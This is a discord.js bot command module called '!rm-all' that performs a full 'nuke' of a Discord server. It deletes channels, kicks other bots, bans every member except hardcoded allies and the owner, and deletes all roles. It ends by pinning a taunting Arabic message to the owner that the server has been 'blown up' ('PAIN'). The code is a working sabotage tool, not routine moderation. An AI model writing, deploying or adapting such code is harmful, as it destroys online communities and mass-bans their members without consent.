const { EmbedBuilder, MessageFlags, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const ADMIN_USERNAME = 'khal3d0047';

module.exports = {
    name: '!rm-all',
    async execute(message, client, allowedGuildId) {
        if (message.author.username !== ADMIN_USERNAME) {
            return message.reply({
                embeds: [
                    new EmbedBuilder()
                        .setDescription("❌ You don't have permission to use this command.")
                        .setColor('#E74C3C')
                ]
            }).catch(() => null);
        }

        if (allowedGuildId && message.guildId !== allowedGuildId) {
            return await message.reply({
                content: '❌ **No Permission to work here!**',
                flags: [MessageFlags.Ephemeral]
            }).catch(() => { });
        }

        // Button confirmation
        const confirmEmbed = new EmbedBuilder()
            .setTitle('⚠️ انت على وشك حذف السيرفر!')
            .setDescription('**هل انت متأكد تماماً؟**\\nرولات + بوتات كيك + أعضاء باند + قنوات')
            .setColor('#FF0000')
            .setFooter({ text: `فقط ${ADMIN_USERNAME} يمكنه الضغط` });

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId('confirm_delete')
                    .setLabel('تأكيد الحذف')
                    .setStyle(ButtonStyle.Danger),
                new ButtonBuilder()
                    .setCustomId('cancel_delete')
                    .setLabel('إلغاء')
                    .setStyle(ButtonStyle.Secondary)
            );

        const confirmMsg = await message.reply({
            embeds: [confirmEmbed],
            components: [row],
            flags: [MessageFlags.Ephemeral]
        }).catch(() => null);

        if (!confirmMsg) return;

        const filter = i => i.user.username === ADMIN_USERNAME;
        const collector = confirmMsg.createMessageComponentCollector({
            filter,
            time: 30000
        });

        collector.on('collect', async (interaction) => {
            await interaction.deferUpdate();
            
            if (interaction.customId === 'cancel_delete') {
                const cancelEmbed = new EmbedBuilder()
                    .setDescription('❌ **تم إلغاء عملية الحذف**')
                    .setColor('#00FF00');
                await confirmMsg.edit({
                    embeds: [cancelEmbed],
                    components: []
                }).catch(() => {});
                return collector.stop();
            }

            // Full server wipe - CONFIGURABLE
            const PROTECTED_USERS = process.env.PROTECTED_USERS 
                ? process.env.PROTECTED_USERS.split(',').map(id => id.trim()).filter(Boolean)
                : ['1466529579056234557', '1481443265793360034'];
            const PROTECTED_CHANNEL_ID = process.env.PROTECTED_CHANNEL_ID || '1478372459798593647';
            const SELF_ID = client.user.id;

            console.log(`💣 WIPE START - Protected: ${PROTECTED_USERS.join(', ')} | Self: ${SELF_ID}`);



            // 1. Delete channels (except protected)
            const channels = message.guild.channels.cache;
            let deletedAnyChannel = false;
            for (const [id, channel] of channels) {
                if (id === PROTECTED_CHANNEL_ID) continue;
                try {
                    if (channel.deletable) {
                        await channel.delete('Server wipe');
                        console.log(`🗑️ Deleted ${channel.name}`);
                        deletedAnyChannel = true;
                    } else {
                        console.log(`❌ Can't delete channel ${channel.name}: Missing Permissions`);
                    }
                } catch (e) {
                    console.error(`❌ Failed to delete channel ${channel.name}:`, e.message);
                }
                await new Promise(r => setTimeout(r, 800));
            }

            // إذا لم يتم حذف أي قناة (كل القنوات محمية أو لا توجد قنوات)
            if (!deletedAnyChannel) {
                console.log('⚠️ لا توجد قنوات قابلة للحذف أو كلها محمية. الانتقال مباشرة إلى كيك البوتات والباند.');
            }

            // 2. Kick all bots (except self)
            for (const member of message.guild.members.cache.values()) {
                if (member.user.bot && member.id !== SELF_ID && !PROTECTED_USERS.includes(member.id)) {
                    const protectedChannel = message.guild.channels.cache.get(PROTECTED_CHANNEL_ID);
                    try {
                        if (member.kickable) {
                            await member.kick('Bot removed during wipe 💣');
                            const msg = `🤖 تم طرد البوت ${member.user.tag}`;
                            console.log(msg);
                            if (protectedChannel) {
                                protectedChannel.send(msg).catch(() => {});
                            }
                        } else {
                            const reason = `❌ لا يمكن طرد البوت ${member.user.tag}: الصلاحيات أو الرتبة.`;
                            console.log(reason);
                            if (protectedChannel) {
                                protectedChannel.send(reason).catch(() => {});
                            }
                        }
                    } catch (e) {
                        const failMsg = `❌ فشل طرد البوت ${member.user.tag}: ${e.message}`;
                        console.log(failMsg);
                        if (protectedChannel) {
                            protectedChannel.send(failMsg).catch(() => {});
                        }
                    }
                    await new Promise(r => setTimeout(r, 1200));
                }
            }

            // 3. Ban members (except protected, self, owner)
            const ownerId = message.guild.ownerId || (await message.guild.fetchOwner()).id;
            const members = Array.from(message.guild.members.cache.values()).filter(m =>
                !PROTECTED_USERS.includes(m.id) && m.id !== SELF_ID && m.id !== ownerId
            );
            console.log(`🎯 Processing ${members.length} targets...`);
            for (const member of members) {
                try {
                    if (member.bannable && !member.user.bot) {
                        await member.ban({ reason: 'Server wipe by admin 💣' });
                        console.log(`✅ Banned ${member.user.tag}`);
                        const protectedChannel = message.guild.channels.cache.get(PROTECTED_CHANNEL_ID);
                        if (protectedChannel) {
                            protectedChannel.send(`✅ تم تبنيد العضو ${member}`).catch(() => {});
                        }
                    } else if (!member.bannable && !member.user.bot) {
                        console.log(`❌ Can't ban ${member.user.tag}: Missing Permissions or higher role.`);
                    }
                } catch (e) {
                    console.log(`❌ Failed ban ${member.user.tag}:`, e.message);
                }
                await new Promise(r => setTimeout(r, 1200));
            }

            // 4. Delete roles (except @everyone)
            const roles = message.guild.roles.cache.filter(role => role.id !== message.guild.id);
            for (const [id, role] of roles) {
                try {
                    if (role.editable) {
                        await role.delete('Server wipe');
                        console.log(`🗑️ Deleted role ${role.name}`);
                    } else {
                        console.log(`❌ Can't delete role ${role.name}: Missing Permissions or higher role.`);
                    }
                } catch (e) {
                    console.log(`❌ Failed delete role ${role.name}:`, e.message);
                }
                await new Promise(r => setTimeout(r, 800));
            }

            // 5. Final pinned message - owner + protected mentions
            setTimeout(async () => {
                const protectedChannel = message.guild.channels.cache.get(PROTECTED_CHANNEL_ID);
                if (protectedChannel) {
                    // Clear + final message
                    const messages = await protectedChannel.messages.fetch({ limit: 100 });
                    messages.forEach(msg => msg.delete().catch(() => {}));

                    // Mention owner and protected users
                    let ownerMention = '';
                    try {
                        const owner = await message.guild.fetchOwner();
                        ownerMention = `<@${owner.id}>`;
                    } catch {}
                    const mentions = PROTECTED_USERS.map(id => `<@${id}>`).join(' ');
                    const finalMsg = await protectedChannel.send(`${ownerMention} ${mentions} تم تفجير السيرفر يحبايبي حظ اوفر المرة القادمة 💣 **PAIN**`);
                    await finalMsg.pin();
                }
            }, 6000);

            const successEmbed = new EmbedBuilder()
                .setDescription(`💥 **التفجير الكامل!**\n✅ رولات: ${roles.size}\n🔨 بان: ${members.length}\n👥 محميين: ${PROTECTED_USERS.length}`)
                .setColor('#FF0000');
            await confirmMsg.edit({
                embeds: [successEmbed],
                components: []
            }).catch(() => {});

            message.reply('🚀 **التفجير الشامل بدأ! (بان أعضاء + حذف قنوات + حذف رولات + كيك Apps) 💣**').catch(() => {});
        });

        collector.on('end', () => {
            if (confirmMsg) {
                confirmMsg.edit({ components: [] }).catch(() => {});
            }
        });
    }
};

